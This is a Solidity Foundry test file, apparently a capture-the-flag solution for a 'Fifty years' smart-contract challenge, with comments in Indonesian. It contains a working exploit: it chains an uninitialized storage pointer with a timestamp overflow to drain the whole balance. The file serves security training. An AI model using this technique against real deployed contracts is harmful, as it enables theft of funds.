// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// #12 Fifty years — kontrak 0.4.21 asli. Dua kerentanan bergabung:
// (1) POINTER STORAGE TAK TERINISIALISASI: di cabang `else` upsert,
// `contribution` dipakai tanpa diinisialisasi (deklarasinya hanya ada
// di cabang `if`). Di Solidity 0.4.x pointer storage tak terinisialisasi
// menunjuk slot 0. Struct Contribution {amount, unlockTimestamp} menempati
// slot 0 dan 1 — yaitu `queue.length` dan `head`. Jadi:
//   contribution.amount = msg.value  ->  queue.length = msg.value
//   contribution.unlockTimestamp = timestamp  ->  head = timestamp
// Lalu queue.push(contribution): length naik 1 DULU, baru struct dibaca
// dari slot 0/1 — sehingga elemen yang di-push = {amount: msg.value+1,
// unlockTimestamp: timestamp}.
// (2) OVERFLOW TIMESTAMP: require(timestamp >= queue[last].unlockTimestamp
// + 1 days) memakai penjumlahan unchecked 0.4.x. Bila elemen terakhir
// punya unlockTimestamp = 2^256 - 1 hari, +1 hari meluber ke 0 —
// sehingga timestamp kecil (0) lolos require.
// Serangan (owner = player, sesuai desain tantangan):
//   A: upsert(index di luar jangkauan, 1 wei, ts = 2^256 - 86400 = MAX-86399)
//      -> length=1, head=2^256-86400, queue[1] = {2, 2^256-86400}.
//      queue[0] asli {1 ether, +50th} TIDAK tertimpa (msg.value=1, bukan 0).
//   B: upsert(index di luar jangkauan, 1 wei, ts = 0)
//      -> require 0 >= (2^256-86400)+86400 mod 2^256 = 0, LOLOS.
//      head kembali 0; queue[1] ditulis ulang {2, 0}.
//   withdraw(1): require hanya memeriksa queue[1].unlockTimestamp (0);
//   loop head=0..1 menjumlah queue[0] (1 ether) + queue[1] (2 wei)
//   = 1 ether + 2 wei = SELURUH saldo -> balance 0.
contract FiftyYearsAttacker {
    address public target;

    function setTarget(address _t) external {
        target = _t;
    }

    function upsert(uint256 index, uint256 timestamp) external payable {
        (bool ok, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("upsert(uint256,uint256)", index, timestamp)
        );
        require(ok);
    }

    function withdraw(uint256 index) external {
        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", index));
        require(ok);
    }

    receive() external payable {}
}

contract FiftyYearsSolve is Test {
    address challenge;
    FiftyYearsAttacker attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        attacker = new FiftyYearsAttacker();
        vm.deal(address(attacker), 10 ether);
        challenge = vm.deployCode(
            "FiftyYearsChallenge.sol:FiftyYearsChallenge",
            abi.encode(address(attacker)),
            1 ether
        );
        attacker.setTarget(challenge);
    }

    function testInit() public view {
        (bool ok, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok);
        assertFalse(abi.decode(ret, (bool)));
    }

    function testSolve() public {
        uint256 MAX = type(uint256).max;
        // A: timestamp raksasa (lolos require pertama), head = 2^256-86400.
        attacker.upsert{value: 1}(5, MAX - 86399); // = 2^256 - 86400
        // B: timestamp 0 lolos karena (2^256-86400)+86400 meluber ke 0.
        attacker.upsert{value: 1}(5, 0);
        // C: withdraw(1) menjumlah queue[0] + queue[1] = seluruh saldo.
        attacker.withdraw(1);
        (bool ok, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok);
        assertTrue(abi.decode(ret, (bool)));
    }
}
